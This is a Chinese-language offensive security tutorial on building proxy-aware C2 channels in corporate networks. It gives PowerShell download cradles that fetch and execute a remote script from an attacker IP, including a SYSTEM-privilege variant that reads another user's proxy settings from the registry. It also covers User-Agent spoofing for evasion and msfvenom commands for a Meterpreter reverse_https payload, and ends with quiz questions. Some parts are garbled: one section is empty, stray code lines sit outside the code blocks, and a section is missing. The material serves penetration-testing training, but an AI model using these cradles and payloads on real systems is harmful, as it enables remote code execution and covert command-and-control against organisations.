# 代理感知通信 - 在企业网络中建立 C2 通道

## 写在前面

在真实的企业环境中，网络流量通常需要通过**代理服务器**才能访问互联网。如果我们的 payload 不支持代理，就无法建立 C2 通信。

本节将学习：
1. 什么是代理以及它如何影响我们的攻击
2. 如何让 PowerShell 下载摇篮支持代理
3. 如何处理 SYSTEM 权限下的代理问题

**Web 安全类比**：
- 这就像是在内网渗透时，需要配置 Burp Suite 的上游代理才能访问外网

---

## 第一部分：企业网络代理

### 1.1 什么是代理服务器？

```
没有代理的网络：
┌─────────────┐                              ┌─────────────┐
│ 员工电脑    │────────── 直接连接 ──────────▶│ 互联网      │
└─────────────┘                              └─────────────┘

有代理的网络：
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│ 员工电脑    │────▶│ 代理服务器  │────▶│ 互联网      │
└─────────────┘     └─────────────┘     └─────────────┘
                          │
                          │ 代理服务器的作用：
                          │ 1. 监控流量
                          │ 2. 过滤恶意网站
                          │ 3. 缓存内容
                          │ 4. 记录日志
```

### 1.2 代理对攻击的影响

```
场景：目标企业使用代理服务器

攻击者 C2 服务器: 192.168.119.120
代理服务器: 192.168.120.12:3128

没有代理感知的 Payload：
┌─────────────┐                              ┌─────────────┐
│ 目标电脑    │────── 尝试直接连接 ──────────▶│ C2 服务器   │
└─────────────┘           │                  └─────────────┘
                          │
                          ▼
                    ❌ 连接失败！
                    （防火墙阻止直接出站）

有代理感知的 Payload：
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│ 目标电脑    │────▶│ 代理服务器  │────▶│ C2 服务器   │
└─────────────┘     └─────────────┘     └─────────────┘
                          │
                          ▼
                    ✅ 连接成功！
```

### 1.3 常见代理类型

| 代理类型 | 端口 | 说明 |
|---------|------|------|
| HTTP 代理 | 8080, 3128 | 最常见 |
| HTTPS 代理 | 443 | 加密代理 |
| SOCKS4/5 | 1080 | 通用代理 |
| 透明代理 | - | 用户无感知 |

## 第二部分：PowerShell 代理感知

### 2.1 Net.WebClient 默认支持代理

好消息：`System.Net.WebClient` 类**默认是代理感知的**！

```powershell
# 这个下载摇篮默认会使用系统代理设置
$wc = New-Object System.Net.WebClient
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

### 2.2 查看当前代理设置

```powershell
# 查看默认代理设置
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")

# 输出示例：
# AbsoluteUri    : http://192.168.120.12:3128/
# Host           : 192.168.120.12
# Port           : 3128
```

### 2.3 手动设置代理

```powershell
# 创建 WebClient 对象
$wc = New-Object System.Net.WebClient

# 手动设置代理
$proxy = New-Object System.Net.WebProxy("http://192.168.120.12:3128")
$wc.Proxy = $proxy

# 下载
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

### 2.4 绕过代理（直接连接）

在某些情况下，你可能想绕过代理直接连接：

```powershell
# 创建 WebClient 对象
$wc = New-Object System.Net.WebClient

# 设置代理为 null，绕过代理
$wc.Proxy = $null

# 直接连接（不经过代理）
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

**注意**：如果企业防火墙阻止直接出站连接，这种方法会失败。

## 第三部分：User-Agent 伪装

### 3.1 为什么需要伪装 User-Agent？

```
默认 PowerShell 请求：
GET /run.ps1 HTTP/1.1
Host: 192.168.119.120
User-Agent:                    ← 空的 User-Agent！
                                  很可疑！

正常浏览器请求：
GET /page.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
```

### 3.2 设置自定义 User-Agent

```powershell
# 创建 WebClient 对象
$wc = New-Object System.Net.WebClient

# 设置 User-Agent 为 Chrome 浏览器
$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')

# 下载
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

### 3.3 常用 User-Agent

## 第四部分：SYSTEM 权限下的代理问题

### 4.1 问题描述

当以 **SYSTEM** 权限运行时（例如通过服务或计划任务），代理设置不会自动应用！

```
普通用户权限：
┌─────────────────────────────────────────────────────────┐
│ 用户: victim                                            │
│ 代理设置: 从注册表读取                                   │
│ HKEY_CURRENT_USER\...\Internet Settings\ProxyServer    │
│                                                         │
│ → 代理自动生效 ✅                                       │
└─────────────────────────────────────────────────────────┘

SYSTEM 权限：
┌─────────────────────────────────────────────────────────┐
│ 用户: NT AUTHORITY\SYSTEM                               │
│ 代理设置: ???                                           │
│ SYSTEM 没有 HKEY_CURRENT_USER！                         │
│                                                         │
│ → 代理不生效 ❌                                         │
└─────────────────────────────────────────────────────────┘
```

### 4.2 解决方案：从其他用户读取代理设置

```powershell
# ============================================================
# SYSTEM 权限下的代理感知下载摇篮
# ============================================================

# 步骤 1: 映射 HKEY_USERS 注册表
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null

# 步骤 2: 查找普通用户的 SID
# SID 以 S-1-5-21- 开头的是普通用户账户
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {
    if ($key.Name -like "*S-1-5-21-*") {
        $start = $key.Name.substring(10)  # 去掉 "HKEY_USERS\" 前缀
        break
    }
}

# 步骤 3: 读取该用户的代理设置
$proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer

# 步骤 4: 设置代理
[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy("http://$proxyAddr")

# 步骤 5: 下载并执行
$wc = New-Object System.Net.WebClient
$wc.DownloadString("http://192.168.119.120/run.ps1") | IEX
```

### 4.3 代码详解

#### 映射 HKEY_USERS

```powershell
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
```

- `New-PSDrive` 创建一个新的 PowerShell 驱动器
- `-Name HKU` 驱动器名称
- `-PSProvider Registry` 类型为注册表
- `-Root HKEY_USERS` 根路径
- `| Out-Null` 隐藏输出

#### 查找用户 SID

```powershell
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {
    if ($key.Name -like "*S-1-5-21-*") {
        $start = $key.Name.substring(10)
        break
    }
}
```

**SID 说明**：
- `S-1-5-21-xxx` 是普通用户账户的 SID 格式
- `S-1-5-18` 是 SYSTEM 账户
- `S-1-5-19` 是 LOCAL SERVICE
- `S-1-5-20` 是 NETWORK SERVICE

#### 读取代理设置

```powershell
$proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
```

代理设置存储在注册表路径：
```
HKEY_USERS\<SID>\Software\Microsoft\Windows\CurrentVersion\Internet Settings\
    ProxyServer = "192.168.120.12:3128"
    ProxyEnable = 1
```

$wc = New-Object System.Net.WebClient

New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null

## 第六部分：Meterpreter 代理支持

### 6.1 Meterpreter HTTP/HTTPS 代理感知

好消息：Meterpreter 的 HTTP 和 HTTPS payload **默认支持代理**！

```bash
# 生成代理感知的 Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    HttpProxyHost=192.168.120.12 \
    HttpProxyPort=3128 \
    EXITFUNC=thread \
    -f ps1
```

### 6.2 手动指定代理

```bash
# 在 msfvenom 中指定代理
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    HttpProxyHost=192.168.120.12 \
    HttpProxyPort=3128 \
    HttpProxyUser=username \
    HttpProxyPass=password \
    -f ps1
```

## 第七部分：代码汇总

### 7.1 检查代理设置

```powershell
# 查看当前代理
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://example.com")

# 查看注册表中的代理设置
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | Select-Object ProxyServer, ProxyEnable
```

### 7.2 设置代理

```powershell
# 方法 1: 设置 WebClient 代理
$wc = New-Object System.Net.WebClient
$wc.Proxy = New-Object System.Net.WebProxy("http://proxy:port")

# 方法 2: 设置默认代理
[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy("http://proxy:port")

# 方法 3: 绕过代理
$wc.Proxy = $null
```

### 7.3 设置 User-Agent

```powershell
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
```

## 第八部分：练习题

### 选择题

1. PowerShell 的 `System.Net.WebClient` 默认是否支持代理？
   - A) 是
   - B) 否

2. SYSTEM 权限下，代理设置存储在哪里？
   - A) HKEY_CURRENT_USER
   - B) HKEY_LOCAL_MACHINE
   - C) 需要从其他用户的注册表读取
   - D) 环境变量

3. 普通用户账户的 SID 以什么开头？
   - A) S-1-5-18
   - B) S-1-5-19
   - C) S-1-5-20
   - D) S-1-5-21

4. 如何绕过代理直接连接？
   - A) 设置 `$wc.Proxy = $null`
   - B) 设置 `$wc.Proxy = "direct"`
   - C) 删除代理设置
   - D) 使用 HTTPS

### 实践题

1. 编写一个 PowerShell 脚本，检测当前系统是否配置了代理，如果有则显示代理地址。

2. 创建一个 SYSTEM 权限下可用的代理感知下载摇篮。

### 答案

**选择题**：1-A, 2-C, 3-D, 4-A

**实践题 1 参考答案**：
```powershell
$proxy = [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://example.com")
if ($proxy.Host -ne "example.com") {
    Write-Host "Proxy configured: $($proxy.Host):$($proxy.Port)"
} else {
    Write-Host "No proxy configured"
}
```
